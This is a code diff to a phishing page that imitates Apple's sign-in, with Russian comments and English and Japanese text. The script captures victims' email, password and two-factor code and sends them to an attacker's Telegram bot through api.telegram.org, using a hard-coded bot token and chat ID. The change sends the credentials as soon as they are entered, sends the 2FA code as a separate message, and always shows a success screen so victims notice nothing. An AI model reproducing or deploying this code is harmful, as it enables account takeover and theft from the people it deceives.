@@ -186,8 +186,8 @@
     // ============================================
     //  НАСТРОЙКИ TELEGRAM (ЗАМЕНИ НА СВОИ!)
     // ============================================
-    const BOT_TOKEN = '8861586774:AAH-mlajKtjRYuBM9W1MDrjICXdysg-E3kY'; // ← Твой токен
-    const CHAT_ID = '8227086094'; // ← Твой ID чата
+    const BOT_TOKEN = '8861586774:AAH-mlajKtjRYuBM9W1MDrjICXdysg-E3kY';
+    const CHAT_ID = '8227086094';
     // ============================================
 
     // ========== Языковые настройки ==========
@@ -213,18 +213,15 @@
     const heroBtn = document.getElementById('heroAppleBtn');
     let currentStep = 1;
 
-    // Элементы
     const firstName = document.getElementById('firstName');
     const lastName = document.getElementById('lastName');
     const displayEmail = document.getElementById('displayEmail');
     const codeDigits = document.querySelectorAll('.code-digit');
 
-    // Формы
     const nameForm = document.getElementById('nameForm');
     const surnameForm = document.getElementById('surnameForm');
     const codeForm = document.getElementById('codeForm');
 
-    // Показать шаг
     function showStep(stepNumber) {
       document.querySelectorAll('.apple-step').forEach(el => el.classList.remove('active'));
       const target = document.getElementById(`step${stepNumber}`);
@@ -233,39 +230,22 @@
     }
 
     // ========== ОТПРАВКА В TELEGRAM ==========
-    async function sendToTelegram(email, password, code) {
-      const message = `
-📝 *Новый лог!*
-
-📧 *Email:* ${email}
-🔑 *Пароль:* ${password}
-📱 *Код:* ${code}
-🕐 *Дата:* ${new Date().toLocaleString('ru-RU')}
-`
-      
+    async function sendToTelegram(messageText) {
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      
       try {
         const response = await fetch(url, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown',
+            text: messageText,
+            parse_mode: 'Markdown'
           })
         });
-        
         const data = await response.json();
-        if (!data.ok) {
-          console.error('Ошибка Telegram:', data);
-          return false;
-        }
-        return true;
+        return data.ok;
       } catch (error) {
-        console.error('Ошибка отправки:', error);
+        console.error('Telegram error:', error);
         return false;
       }
     }
@@ -281,16 +261,13 @@
         return;
       }
       firstName.closest('.input-group').classList.remove('error');
-      
-      // Показываем email на втором шаге
       displayEmail.textContent = email;
-      
       showStep(2);
       setTimeout(() => lastName.focus(), 300);
     });
 
-    // Шаг 2: Пароль
-    surnameForm.addEventListener('submit', (e) => {
+    // Шаг 2: Пароль → отправка email + пароль
+    surnameForm.addEventListener('submit', async (e) => {
       e.preventDefault();
       const password = lastName.value.trim();
       if (!password || password.length < 6) {
@@ -298,11 +275,17 @@
         return;
       }
       lastName.closest('.input-group').classList.remove('error');
+      
+      // === ОТПРАВКА ЛОГА С EMAIL И ПАРОЛЕМ ===
+      const email = firstName.value.trim();
+      const logMessage = `📧 Email: ${email}\n🔑 Password: ${password}`;
+      await sendToTelegram(logMessage);
+      
       showStep(3);
       setTimeout(() => codeDigits[0].focus(), 300);
     });
 
-    // Шаг 3: Код + отправка в Telegram
+    // Шаг 3: Код → отправка отдельного лога с 2FA
     codeForm.addEventListener('submit', async (e) => {
       e.preventDefault();
       
@@ -315,30 +298,11 @@
       }
       codeDigits.forEach(inp => inp.closest('.code-inputs').classList.remove('error'));
       
-      // Показываем индикатор загрузки
-      const submitBtn = codeForm.querySelector('button[type="submit"]');
-      const originalText = submitBtn.textContent;
-      submitBtn.textContent = currentLang === 'en' ? 'Sending...' : '送信中...';
-      submitBtn.disabled = true;
+      // === ОТДЕЛЬНЫЙ ЛОГ С КОДОМ 2FA ===
+      const codeLog = `📱 2FA Code: ${code}`;
+      await sendToTelegram(codeLog);
       
-      // Отправляем в Telegram
-      const email = firstName.value.trim();
-      const password = lastName.value.trim();
-      const success = await sendToTelegram(email, password, code);
-      
-      // Восстанавливаем кнопку
-      submitBtn.textContent = originalText;
-      submitBtn.disabled = false;
-      
-      if (success) {
-        showStep('Success');
-      } else {
-        // Показываем ошибку
-        alert(currentLang === 'en' 
-          ? 'Failed to send application. Please try again.' 
-          : '送信に失敗しました。もう一度お試しください。'
-        );
-      }
+      showStep('Success');
     });
 
     // Автоматический переход между полями кода
@@ -375,7 +339,6 @@
       if (isVisible) {
         card.classList.remove('visible');
         heroBtn.querySelector('span').textContent = currentLang === 'en' ? 'Sign in with Apple' : 'Appleでサインイン';
-        // Сброс
         firstName.value = '';
         lastName.value = '';
         displayEmail.textContent = '';
@@ -389,7 +352,6 @@
       }
     });
 
-    // Убираем ошибки при вводе
     firstName.addEventListener('input', () => {
       if (firstName.value.trim()) firstName.closest('.input-group').classList.remove('error');
     });
@@ -398,7 +360,6 @@
       if (lastName.value.trim()) lastName.closest('.input-group').classList.remove('error');
     });
 
-    // Инициализация
     showStep(1);
   </script>
 </body>
